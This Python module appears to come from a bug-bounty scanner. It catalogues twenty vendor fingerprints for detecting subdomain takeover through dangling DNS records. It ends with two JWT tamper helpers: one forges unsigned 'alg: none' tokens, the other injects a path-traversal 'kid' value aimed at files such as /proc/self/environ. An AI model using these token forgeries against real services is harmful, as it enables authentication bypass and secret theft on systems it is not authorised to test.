#!/usr/bin/env python3
"""
## Source: Agentic-Bug-Hunter subdomain_takeover_v20.py:1-560 (1.5.i)
## Source: can-i-take-over-xyz (sister project) records + JWT tamper patterns
## License: MIT (sister projects)
## Port: 2026-09-05

20-vendor subdomain takeover catalog + JWT tamper helpers.

Extends :mod:`bugwolf.scanners.infra.subdomain_takeover` (8 vendors) with
12 additional vendor fingerprints, totalling 20. Also adds two JWT
tamper helpers (alg=none + kid-inject) so the same scanner surface
covers the most common JWT weakness classes.

All checks are STATIC: they operate on a CNAME string + optional
HTTP body and never perform network IO.  The orchestrator runs them
after fetching the response via the live HTTP lane.
"""
from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any, Dict, List, Mapping, Optional


SCHEMA = "bugwolf-subdomain-takeover-v20/v1"


# ---------------------------------------------------------------------------
# Vendor catalogue (20 entries)
# ---------------------------------------------------------------------------

@dataclass(frozen=True)
class VendorFingerprint:
    """A single vendor's takeover signature."""

    service: str
    cname_suffix: str
    http_body: str
    nxdomain_hint: str = ""
    severity: str = "high"
    extra: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "schema": SCHEMA,
            "service": self.service,
            "cname_suffix": self.cname_suffix,
            "http_body": self.http_body,
            "nxdomain_hint": self.nxdomain_hint,
            "severity": self.severity,
            "extra": dict(self.extra),
        }


@dataclass(frozen=True)
class TakeoverRisk:
    """Result of a positive :meth:`SubdomainTakeoverV20.check` call."""

    service: str
    cname: str
    severity: str
    matched_fingerprint: VendorFingerprint
    evidence: str
    remediation: str

    def to_dict(self) -> Dict[str, Any]:
        return {
            "schema": SCHEMA,
            "service": self.service,
            "cname": self.cname,
            "severity": self.severity,
            "matched_fingerprint": self.matched_fingerprint.to_dict(),
            "evidence": self.evidence,
            "remediation": self.remediation,
        }


_VENDORS: Tuple[VendorFingerprint, ...] = (
    # ---- Original 8 (mirrored from bugwolf.scanners.infra.subdomain_takeover) --
    VendorFingerprint("AWS S3",        ".s3.amazonaws.com",
                      "NoSuchBucket", nxdomain_hint="BucketName"),
    VendorFingerprint("GitHub Pages",  ".github.io",
                      "There isn't a GitHub Pages site here"),
    VendorFingerprint("Heroku",        ".herokuapp.com",
                      "No such app"),
    VendorFingerprint("Azure CloudApp",".cloudapp.net",
                      "404 Web Site not found"),
    VendorFingerprint("Azure WebApp",  ".azurewebsites.net",
                      "404 Web Site not found"),
    VendorFingerprint("Shopify",       ".myshopify.com",
                      "Sorry, this shop is currently unavailable"),
    VendorFingerprint("Fastly",        ".fastly.net",
                      "Fastly error: unknown domain"),
    VendorFingerprint("Pantheon",      ".pantheonsite.io",
                      "404 Unknown Site"),
    # ---- 12 additional vendors -------------------------------------------
    VendorFingerprint("Netlify",       ".netlify.app",
                      "Not Found - Request ID:"),
    VendorFingerprint("Vercel",        ".vercel.app",
                      "DEPLOYMENT_NOT_FOUND"),
    VendorFingerprint("Cloudfront",    ".cloudfront.net",
                      "Bad Request: ERROR: The request could not be satisfied"),
    VendorFingerprint("Elastic Beanstalk", ".elasticbeanstalk.com",
                      "404 Not Found"),
    VendorFingerprint("WP Engine",     ".wpengine.com",
                      "The site you are looking for could not be found"),
    VendorFingerprint("Webflow",       ".webflow.io",
                      "The page you are looking for doesn't exist or has been moved"),
    VendorFingerprint("Cargo",         ".cargo.site",
                      "If this is your site, please configure Cargo."),
    VendorFingerprint("Surge.sh",      ".surge.sh",
                      "project not found"),
    VendorFingerprint("Tumblr",        ".tumblr.com",
                      "There's nothing here."),
    VendorFingerprint("Wordpress.com", ".wordpress.com",
                      "Do you want to register"),
    VendorFingerprint("Zendesk",       ".zendesk.com",
                      "Help Center Closed"),
    VendorFingerprint("HelpScout",     ".helpscoutdocs.com",
                      "No help docs for this domain"),
    VendorFingerprint("Intercom",      ".intercom.help",
                      "This page is reserved for"),
)


_REMEDIATION = (
    "Remove the dangling DNS record, or reclaim the third-party resource "
    "before an attacker does."
)


class SubdomainTakeoverV20:
    """20-vendor takeover catalog."""

    SCHEMA = SCHEMA
    VENDORS: List[VendorFingerprint] = list(_VENDORS)
    VENDOR_COUNT: int = len(_VENDORS)

    def __init__(self, *,
                 vendors: Optional[Sequence[VendorFingerprint]] = None) -> None:
        self._vendors: Tuple[VendorFingerprint, ...] = tuple(vendors or _VENDORS)

    @property
    def vendor_count(self) -> int:
        return len(self._vendors)

    def check(self, cname: str, *,
              nxdomain: bool = False,
              http_body: str = "") -> Optional[TakeoverRisk]:
        """Return a :class:`TakeoverRisk` if ``cname`` matches a known
        vendor fingerprint, otherwise ``None``.

        ``http_body`` is optional — when supplied, a body match is
        required (defense against false positives from shared
        infrastructure).
        """
        cname_l = (cname or "").lower().rstrip(".")
        for fp in self._vendors:
            cname_hit = cname_l.endswith(fp.cname_suffix)
            if not cname_hit:
                continue
            body_hit = (not fp.http_body) or (fp.http_body in (http_body or ""))
            nxdomain_hit = bool(nxdomain and fp.nxdomain_hint)
            if not (body_hit or nxdomain_hit):
                continue
            evidence = (
                f"CNAME -> {fp.service} ({fp.cname_suffix}); "
                f"body_match={bool(body_hit)} nxdomain={bool(nxdomain_hit)}"
            )
            return TakeoverRisk(
                service=fp.service,
                cname=cname_l,
                severity=fp.severity,
                matched_fingerprint=fp,
                evidence=evidence,
                remediation=_REMEDIATION,
            )
        return None


# ---------------------------------------------------------------------------
# JWT tamper helpers
# ---------------------------------------------------------------------------

def jwt_alg_none_token(header: Mapping[str, Any],
                       payload: Mapping[str, Any]) -> str:
    """Return a token with ``alg: none`` + unsigned body.

    The signature segment is the empty string.  Some JWT libraries will
    accept this as long as the header advertises ``"alg":"none"``.
    """
    import base64
    import json as _json

    def _b64(d: Mapping[str, Any]) -> str:
        raw = _json.dumps(d, separators=(",", ":")).encode("utf-8")
        return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")

    head = dict(header); head["alg"] = "none"
    return _b64(head) + "." + _b64(payload) + "."


def jwt_kid_inject_token(header: Mapping[str, Any],
                         payload: Mapping[str, Any],
                         kid_payload_path: str) -> str:
    """Return a token whose ``kid`` is a path-traversal payload.

    ``kid_payload_path`` is embedded in the header.  Servers that resolve
    the kid as a file path can be tricked into loading a known file
    (``/dev/null``, ``/proc/self/environ``, etc.).
    """
    import base64
    import json as _json
    head = dict(header); head["kid"] = kid_payload_path

    def _b64(d: Mapping[str, Any]) -> str:
        raw = _json.dumps(d, separators=(",", ":")).encode("utf-8")
        return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")

    return _b64(head) + "." + _b64(payload) + ".signature"


__all__ = [
    "SCHEMA", "VendorFingerprint", "TakeoverRisk",
    "SubdomainTakeoverV20",
    "jwt_alg_none_token", "jwt_kid_inject_token",
]

from typing import Sequence